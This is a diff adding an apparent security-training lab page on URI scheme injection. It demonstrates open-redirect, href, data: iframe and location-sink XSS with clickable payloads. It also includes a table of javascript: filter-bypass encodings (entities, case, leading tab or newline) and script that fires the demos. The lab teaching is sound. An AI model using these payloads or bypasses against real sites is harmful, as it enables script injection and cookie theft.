@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attack 03 — URI Scheme Injection</title>
+  <style>
+    :root{--bg:#0b0f1a;--bg2:#111827;--card:#141c2e;--border:#1e3a5f;
+          --gold:#f5c842;--cyan:#38bdf8;--purple:#a78bfa;--red:#f87171;
+          --green:#4ade80;--orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;padding:32px}
+    .wrap{max-width:860px;margin:0 auto}
+    h1{font-size:28px;color:var(--gold);margin-bottom:6px}
+    .subtitle{color:var(--muted);font-size:14px;margin-bottom:32px}
+    h2{font-size:16px;color:var(--cyan);margin:0 0 14px}
+    .step{background:var(--card);border:1px solid var(--border);border-radius:8px;
+          padding:22px 24px;margin-bottom:16px}
+    .step-header{display:flex;align-items:baseline;gap:12px;margin-bottom:12px}
+    .step-num{background:var(--border);color:var(--cyan);font-size:11px;font-weight:700;
+              width:24px;height:24px;border-radius:50%;display:flex;align-items:center;
+              justify-content:center;flex-shrink:0}
+    .step-title{font-size:14px;font-weight:700;color:var(--text)}
+    .step p{font-size:13.5px;color:var(--muted);line-height:1.6;margin-bottom:12px}
+    .payload{background:#060d1a;border:1px solid var(--border);border-radius:4px;
+             padding:10px 14px;font-family:'Courier New',monospace;font-size:12.5px;
+             color:var(--orange);margin:8px 0;word-break:break-all}
+    .btn{display:inline-block;padding:8px 16px;border:none;border-radius:4px;
+         cursor:pointer;font-size:13px;font-weight:600;margin:4px 4px 4px 0;
+         text-decoration:none}
+    .btn-fire{background:#4a1515;color:var(--red);border:1px solid var(--red)}
+    .btn-fire:hover{background:#5a1515}
+    .btn-info{background:#0a1f13;color:var(--green);border:1px solid var(--green)}
+    .btn-info:hover{background:#0d2918}
+    .btn-neutral{background:var(--bg2);color:var(--muted);border:1px solid var(--border)}
+    .result-box{min-height:40px;background:#060d1a;border:2px dashed var(--border);
+                border-radius:4px;padding:10px;font-size:12px;margin-top:8px;
+                color:var(--muted);font-family:'Courier New',monospace}
+    .tag{display:inline-block;font-size:10px;font-weight:700;padding:2px 7px;
+         border-radius:3px;letter-spacing:.08em;margin-bottom:8px}
+    .tag-danger{background:#2d0a0a;color:var(--red);border:1px solid var(--red)}
+    .tag-note{background:#0f1f3a;color:var(--cyan);border:1px solid var(--border)}
+    table{width:100%;border-collapse:collapse;margin-top:12px;font-size:12.5px}
+    th{background:var(--bg2);color:var(--cyan);padding:8px 10px;text-align:left;
+       border-bottom:1px solid var(--border)}
+    td{padding:8px 10px;border-bottom:1px solid var(--border);vertical-align:top}
+    td:first-child{font-family:'Courier New',monospace;color:var(--orange);white-space:nowrap}
+    code{font-family:'Courier New',monospace;font-size:11.5px;background:#060d1a;
+         color:var(--cyan);padding:1px 4px;border-radius:2px}
+    .nav{display:flex;justify-content:space-between;align-items:center;
+         margin-bottom:28px;font-size:13px;color:var(--muted)}
+    .nav a{color:var(--cyan);text-decoration:none}
+    hr{border:none;border-top:1px solid var(--border);margin:20px 0}
+  </style>
+</head>
+<body>
+<div class="wrap">
+  <nav class="nav">
+    <a href="/">← Lab Home</a>
+    <span>Module 06 — URI Scheme Injection</span>
+    <a href="/tutorial.html" style="display:none">Tutorial</a>
+  </nav>
+
+  <h1>Attack 03 — URI Scheme Injection</h1>
+  <p class="subtitle">
+    Exploiting attributes that accept URLs: href, src, action, formaction, data, xlink:href.
+    The <code>javascript:</code> scheme turns any clickable element into a script executor.
+    The <code>data:</code> scheme creates an inline document the browser trusts.
+  </p>
+
+  <!-- ─────────────────────────────────────────────────────────── Step 1 -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-num">1</div>
+      <div class="step-title">The Open Redirect — Server Trusts Any URL</div>
+    </div>
+    <span class="tag tag-note">Reflected — requires click</span>
+    <p>
+      The <code>/redirect</code> endpoint accepts a <code>url=</code> parameter
+      and calls <code>redirect(url)</code> with no validation. The Location header
+      is set to whatever the attacker supplies. When the scheme is
+      <code>javascript:</code>, the browser executes the expression in the origin
+      of the redirecting page.
+    </p>
+    <div class="payload">/redirect?url=javascript:alert(document.origin)</div>
+    <a class="btn btn-fire" href="/redirect?url=javascript:alert(document.origin)" target="_blank">
+      Fire (new tab)
+    </a>
+    <button class="btn btn-info" onclick="checkRedirectBehavior()">Analyze in Network panel</button>
+    <div class="result-box" id="step1-result">Click "Analyze" and open DevTools → Network to see the 302 Location header with javascript: value.</div>
+  </div>
+
+  <!-- ─────────────────────────────────────────────────────────── Step 2 -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-num">2</div>
+      <div class="step-title">href Injection — The Direct Vector</div>
+    </div>
+    <span class="tag tag-danger">Executes on click</span>
+    <p>
+      When user-supplied data is interpolated into an <code>href</code> attribute
+      without scheme validation, any link on the page can become a JavaScript
+      executor. The payload below injects into the <code>/link-preview</code>
+      endpoint which places it directly in <code>&lt;a href="..."&gt;</code>.
+    </p>
+    <div class="payload">/link-preview?url=javascript:alert(document.cookie)</div>
+    <a class="btn btn-fire" href="/link-preview?url=javascript:alert(document.cookie)" target="_blank">
+      Open Link Preview
+    </a>
+    <p style="font-size:12px;color:var(--muted);margin-top:8px">
+      On the destination page, click the rendered yellow link. The
+      <code>javascript:</code> URI fires in the origin of <code>localhost:5000</code>.
+    </p>
+  </div>
+
+  <!-- ─────────────────────────────────────────────────────────── Step 3 -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-num">3</div>
+      <div class="step-title">data: URI in an iframe — Framed Document Attack</div>
+    </div>
+    <span class="tag tag-danger">Zero interaction — auto-executes</span>
+    <p>
+      A <code>data:text/html,</code> URI creates a full HTML document inline.
+      When injected into an <code>&lt;iframe src=&gt;</code> or loaded via
+      <code>location=</code>, the browser renders it as a real document.
+      Scripts inside it execute in a null origin — but the iframe can reach
+      the parent's DOM if they share the same origin, and can perform
+      phishing-quality overlays regardless of origin.
+    </p>
+    <div class="payload">data:text/html,&lt;script&gt;alert('data URI iframe — origin: '+document.domain)&lt;/script&gt;</div>
+    <button class="btn btn-fire" onclick="injectDataIframe()">Inject data: iframe</button>
+    <button class="btn btn-neutral" onclick="clearDataDemo()">Clear</button>
+    <div id="data-iframe-container" style="margin-top:10px"></div>
+  </div>
+
+  <!-- ─────────────────────────────────────────────────────────── Step 4 -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-num">4</div>
+      <div class="step-title">Profile Page — Three Injection Points</div>
+    </div>
+    <span class="tag tag-note">Combined M05 + M06 vectors</span>
+    <p>
+      The <code>/profile</code> page accepts three URL-like parameters.
+      Each maps to a different injection context demonstrating how a single
+      page surface can expose multiple URI injection points simultaneously.
+    </p>
+    <div class="payload">/profile?username=eve&amp;bio=&lt;img src=x onerror=alert(1)&gt;&amp;site=javascript:alert(document.cookie)</div>
+    <a class="btn btn-fire"
+       href="/profile?username=eve&bio=<img src=x onerror=alert(1)>&site=javascript:alert(document.cookie)"
+       target="_blank">
+      Fire Profile Combo
+    </a>
+    <p style="font-size:12px;color:var(--muted);margin-top:8px">
+      <code>bio=</code> triggers <code>onerror</code> immediately (zero interaction).
+      Then click the "Website" link to fire the <code>javascript:</code> href.
+    </p>
+  </div>
+
+  <!-- ─────────────────────────────────────────────────────────── Step 5 -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-num">5</div>
+      <div class="step-title">Attributes That Accept URLs — The Full Inventory</div>
+    </div>
+    <span class="tag tag-note">Reference</span>
+    <p>
+      Any attribute that accepts a URL is a potential injection point if the
+      value is user-supplied. The table below covers the most common ones.
+      A defence must validate the scheme for <em>all</em> of these, not just <code>href</code>.
+    </p>
+    <table>
+      <thead><tr><th>Attribute</th><th>Element(s)</th><th>Mechanism</th><th>Dangerous scheme</th></tr></thead>
+      <tbody>
+        <tr><td>href</td><td>a, area, link</td><td>Browser follows on click / meta-refresh</td><td>javascript:, data:</td></tr>
+        <tr><td>src</td><td>img, script, iframe, audio, video, input[type=image]</td><td>Browser fetches / renders resource</td><td>javascript: (IE legacy), data:text/html</td></tr>
+        <tr><td>action</td><td>form</td><td>Form submission destination</td><td>javascript:</td></tr>
+        <tr><td>formaction</td><td>input[type=submit], button</td><td>Overrides form action on submit</td><td>javascript:</td></tr>
+        <tr><td>data</td><td>object</td><td>Plugin / resource URL</td><td>data:text/html</td></tr>
+        <tr><td>xlink:href</td><td>SVG use, image</td><td>SVG resource reference</td><td>javascript: (legacy browsers)</td></tr>
+        <tr><td>poster</td><td>video</td><td>Thumbnail image URL</td><td>data: (phishing)</td></tr>
+        <tr><td>background</td><td>body, table (legacy)</td><td>Background image</td><td>javascript: (IE legacy)</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- ─────────────────────────────────────────────────────────── Step 6 -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-num">6</div>
+      <div class="step-title">javascript: URI Obfuscation</div>
+    </div>
+    <span class="tag tag-danger">Filter bypass — executes on click</span>
+    <p>
+      Browsers tolerate extensive whitespace and encoding variations in the
+      scheme portion of URIs. Filters that check for the literal string
+      <code>javascript:</code> are easily bypassed. All of the following
+      execute in modern browsers when placed in an <code>href</code>:
+    </p>
+    <table>
+      <thead><tr><th>Payload</th><th>Bypass technique</th><th>Browsers</th></tr></thead>
+      <tbody>
+        <tr><td>javascript:alert(1)</td><td>Baseline</td><td>All</td></tr>
+        <tr><td>&#106;avascript:alert(1)</td><td>HTML entity in scheme (&#106; = j)</td><td>All</td></tr>
+        <tr><td>java&#115;cript:alert(1)</td><td>Entity mid-scheme</td><td>All</td></tr>
+        <tr><td>JAVASCRIPT:alert(1)</td><td>Uppercase scheme</td><td>All</td></tr>
+        <tr><td>&#x6A;avascript:alert(1)</td><td>Hex entity</td><td>All</td></tr>
+        <tr><td>javascript&#58;alert(1)</td><td>Colon as entity &#58;</td><td>All</td></tr>
+        <tr><td>&#09;javascript:alert(1)</td><td>Leading tab (U+0009)</td><td>Chrome, Firefox</td></tr>
+        <tr><td>&#10;javascript:alert(1)</td><td>Leading newline (U+000A)</td><td>Chrome, Firefox</td></tr>
+      </tbody>
+    </table>
+    <button class="btn btn-fire" onclick="injectObfuscatedLink()">Inject obfuscated href into DOM</button>
+    <div class="result-box" id="step6-result" style="margin-top:8px">Click the injected link after firing.</div>
+  </div>
+
+  <!-- ─────────────────────────────────────────────────────────── Step 7 -->
+  <div class="step">
+    <div class="step-header">
+      <div class="step-num">7</div>
+      <div class="step-title">DOM Sink: location = "javascript:..." </div>
+    </div>
+    <span class="tag tag-danger">DOM-based — zero server interaction</span>
+    <p>
+      When JavaScript reads a URL from the DOM or a query string and assigns
+      it to <code>location</code>, <code>location.href</code>, or
+      <code>location.replace()</code>, the <code>javascript:</code> scheme
+      executes immediately with zero server involvement. This is one of the
+      most common DOM XSS patterns in the wild.
+    </p>
+    <div class="payload">// Vulnerable pattern:
+const url = new URLSearchParams(location.search).get("next");
+location.href = url;  // if url = "javascript:alert(1)" → executes</div>
+    <button class="btn btn-fire" onclick="demoLocationSink()">Simulate location sink</button>
+    <div class="result-box" id="step7-result">Click to simulate: location.href = "javascript:alert(document.origin)"</div>
+  </div>
+
+</div>
+
+<script>
+function checkRedirectBehavior() {
+  document.getElementById("step1-result").textContent =
+    "Opening /redirect in background fetch to capture headers...";
+  fetch("/redirect?url=javascript:alert(1)", { redirect: "manual" })
+    .then(r => {
+      const loc = r.headers.get("location") || "(check Network tab — fetch may not expose Location header cross-origin)";
+      document.getElementById("step1-result").textContent =
+        "HTTP status: " + r.status + "\nLocation: " + loc +
+        "\n\nOpen DevTools → Network → click the 'Fire' link to see the 302 response.";
+    })
+    .catch(e => {
+      document.getElementById("step1-result").textContent =
+        "Fetch error (expected for redirect): " + e.message +
+        "\nOpen DevTools → Network and click the 'Fire (new tab)' button to inspect the 302 header.";
+    });
+}
+
+function injectDataIframe() {
+  const container = document.getElementById("data-iframe-container");
+  container.innerHTML = "";
+  const iframe = document.createElement("iframe");
+  iframe.src = "data:text/html,<style>body{background:#1a0a2e;color:#e2e8f0;font-family:sans-serif;padding:20px}</style><h3 style='color:#a78bfa'>data: iframe document</h3><p>Origin: <strong id=o></strong></p><script>document.getElementById('o').textContent=document.domain||'null (data: origin)'<\/script>";
+  iframe.style.cssText = "width:100%;height:120px;border:2px dashed #a78bfa;border-radius:4px;background:#1a0a2e";
+  container.appendChild(iframe);
+}
+
+function clearDataDemo() {
+  document.getElementById("data-iframe-container").innerHTML = "";
+}
+
+function injectObfuscatedLink() {
+  const result = document.getElementById("step6-result");
+  result.innerHTML = "";
+  const a = document.createElement("a");
+  // Tab character before javascript: — bypasses naive string filter
+  a.setAttribute("href", "\x09javascript:alert('Obfuscated javascript: via leading tab — href bypass confirmed')");
+  a.textContent = "Click me — obfuscated javascript: href";
+  a.style.cssText = "color:#f5c842;font-size:14px;display:block;padding:6px 0";
+  result.appendChild(a);
+  result.style.borderColor = "#f87171";
+}
+
+function demoLocationSink() {
+  const result = document.getElementById("step7-result");
+  result.textContent = "Executing: location.href = \"javascript:alert(document.origin)\"";
+  setTimeout(() => {
+    // Simulate what vulnerable code does — assign attacker-controlled value to location
+    location.href = "javascript:alert('DOM sink: location.href\\nOrigin: ' + document.origin)";
+  }, 400);
+}
+</script>
+</body>
+</html>
